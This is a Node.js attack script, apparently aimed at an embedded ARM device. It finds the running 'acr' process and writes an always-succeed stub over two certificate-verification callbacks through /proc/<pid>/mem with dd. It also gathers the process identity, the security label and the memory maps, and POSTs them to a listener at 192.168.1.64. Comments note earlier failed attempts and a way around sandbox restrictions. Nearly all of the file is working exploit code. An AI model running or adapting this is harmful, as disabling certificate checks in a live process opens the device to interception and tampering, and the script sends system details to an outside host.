"use strict";
// audit80.js - patch acr's OWN cert-verify callbacks in process memory.
// Prior rounds targeted libVDCurl (wrong) and used node fs (sandboxed -> EACCES).
// acr is non-PIE (maps at 0x10000) so callback VAs are absolute:
//   AcrControlVerifyCertCallback  VA 0x96c08  (file off 0x86c08)
//   lws_VerifyCertCallback        VA 0x97c84  (file off 0x87c84)
// Patch both to Thumb "movs r0,#1 ; bx lr" (01 20 70 47) = always-verify-success.
// Uses dd via child_process (NOT node fs) for /proc/<pid>/mem.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, cap || 6000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var STUB = "01207047";                       // movs r0,#1 ; bx lr
var T = [
    { name: "AcrControlVerifyCertCallback", addr: 0x96c08 },
    { name: "lws_VerifyCertCallback",       addr: 0x97c84 }
];

var out = {};
out.started = new Date().toISOString();
out.id = sh("id | head -c 160");
out.smack = sh("cat /proc/self/attr/current");
out.acr_ps = sh("ps 2>/dev/null | grep '/usr/bin/acr' | grep -v grep | head -3", 800);
out.pidof = sh("pidof acr", 200);
out.maps_head = sh("for p in $(pidof acr); do echo PID $p; grep '/usr/bin/acr' /proc/$p/maps | head -3; done", 800);

// parse a pid
var pid = null;
var pm = out.pidof.match(/(\d+)/);
if (pm) { pid = pm[1]; }
if (!pid) {
    var qm = out.acr_ps.match(/\s(\d+)\s+\d+\s/);
    if (qm) { pid = qm[1]; }
}
out.pid = pid;

if (!pid) {
    out.patch = "no acr pid found";
    post("/p80_diag", out);
    post("/p80_done", { started: out.started });
} else {
    // build stub file once
    out.stub = sh("printf '\\x01\\x20\\x70\\x47' > /tmp/.p80stub && od -An -tx1 /tmp/.p80stub", 200);

    var res = [];
    T.forEach(function (t) {
        var dec = t.addr;                       // decimal VA
        var before = sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 200);
        var wr = sh("dd if=/tmp/.p80stub of=/proc/" + pid + "/mem bs=1 seek=" + dec + " count=4 conv=notrunc 2>&1 | tail -1", 200);
        var after = sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 200);
        res.push({ name: t.name, addr: "0x" + t.addr.toString(16), dec: dec,
                   before: before.trim(), write: wr.trim(), after: after.trim() });
    });
    out.patch = res;
    post("/p80_patch", out);
    post("/p80_done", { started: out.started });
}
